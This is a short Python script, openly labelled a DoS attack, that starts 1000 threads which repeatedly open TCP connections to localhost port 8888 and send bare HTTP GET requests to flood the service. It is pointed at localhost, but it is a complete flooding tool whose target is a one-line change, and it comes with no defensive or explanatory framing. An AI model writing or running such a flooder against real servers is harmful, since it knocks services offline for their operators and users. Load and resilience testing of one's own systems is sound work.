import socket
import threading
import time

def attack(target, port):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.sendto(("GET /" + " HTTP/1.1\r\n").encode('ascii'), (target, port))
            s.sendto(("Host: " + "localhost" + "\r\n\r\n").encode('ascii'), (target, port))
            s.close()
        except Exception as e:
            print(f"Error: {e}")

def main():
    target = 'localhost'
    port = 8888
    num_threads = 1000

    print(f"Starting DoS attack on {target}:{port} with {num_threads} threads.")

    for i in range(num_threads):
        thread = threading.Thread(target=attack, args=(target, port))
        thread.daemon = True
        thread.start()

    while True:
        time.sleep(1)

if __name__ == '__main__':
    main()

